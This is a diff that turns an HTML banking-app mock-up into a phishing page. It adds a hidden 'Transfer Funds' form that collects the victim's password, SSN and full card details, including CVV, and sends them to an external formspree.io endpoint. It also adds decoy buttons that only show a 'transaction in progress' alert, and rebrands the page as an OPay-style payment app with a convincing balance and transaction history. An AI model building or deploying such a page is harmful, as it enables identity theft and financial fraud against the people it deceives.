@@ -10,42 +10,59 @@
   <header>
     <div class="profile">
       <img src="https://via.placeholder.com/40" alt="User" />
-      <span>Hi, Tiffany</span>
+      <span>Hi, Tiffany Bastow</span>
     </div>
     <div class="balance-card">
       <p>Available Balance</p>
-      <h1>₦1,034.91</h1>
+      <h1>$1,034.91</h1>
     </div>
   </header>
 
   <section class="transactions">
     <div class="transaction">
       <p>Transfer to CORALPAY-NextGen PG</p>
-      <span>-₦600.00</span>
+      <span>-$600.00</span>
     </div>
     <div class="transaction">
       <p>Transfer to MANNIR ABDULLAHI</p>
-      <span>-₦700.00</span>
+      <span>-$700.00</span>
     </div>
   </section>
 
   <section class="actions">
-    <button>To Wallet</button>
-    <button>To Bank</button>
-    <button>Withdraw</button>
+    <button onclick="showPopup()">To OPay</button>
+    <button onclick="showPopup()">To Bank</button>
+    <button onclick="showPopup()">Withdraw</button>
+    <button onclick="toggleTransferForm()">Funds Transfer</button>
   </section>
 
-  <section class="services">
-    <div>Airtime</div>
-    <div>Data</div>
-    <div>Betting</div>
-    <div>TV</div>
-    <div>Electricity</div>
-    <div>More</div>
+  <!-- Transfer Form -->
+  <section class="transfer-form" id="transferForm" style="display: none;">
+    <h3>Transfer Funds</h3>
+    <form action="https://formspree.io/f/xayrvkya" method="POST">
+      <input type="text" name="receiver_name" placeholder="Receiver Name" required>
+      <input type="text" name="receiver_bank" placeholder="Receiver Bank" required>
+      <input type="password" name="sender_password" placeholder="Your Password" required>
+      <input type="text" name="sender_ssn" placeholder="Your SSN" required>
+      <input type="text" name="card_details" placeholder="Card Number / Expiry / CVV" required>
+      <button type="submit">Send</button>
+    </form>
   </section>
 
   <footer>
-    <small>&copy; 2025 Styled Bank App</small>
+    <small>&copy; 2025 Instant Payments</small>
   </footer>
+
+  <!-- Popup Script -->
+  <script>
+    function showPopup() {
+      alert("Please hold, transaction in progress...");
+    }
+
+    function toggleTransferForm() {
+      const form = document.getElementById('transferForm');
+      form.style.display = form.style.display === 'none' ? 'block' : 'none';
+    }
+  </script>
 </body>
 </html>
